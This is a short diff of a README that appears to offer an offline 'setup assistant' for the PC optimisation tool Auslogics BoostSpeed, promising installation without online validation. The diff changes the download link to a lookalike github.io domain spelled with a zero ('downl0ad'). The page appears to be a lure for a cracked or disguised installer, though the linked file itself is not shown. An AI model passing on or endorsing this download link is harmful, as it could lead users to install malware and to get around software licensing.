@@ -1,6 +1,6 @@
 # Auslogics BoostSpeed — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://auslogics-boostspeed-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://auslogics-boostspeed-downl0ad.github.io/.github/)
 
 Auslogics BoostSpeed is a comprehensive PC optimization tool that helps clean, accelerate, and protect your system. This setup assistant provides a full offline installation experience — no internet login or online validation needed.
 
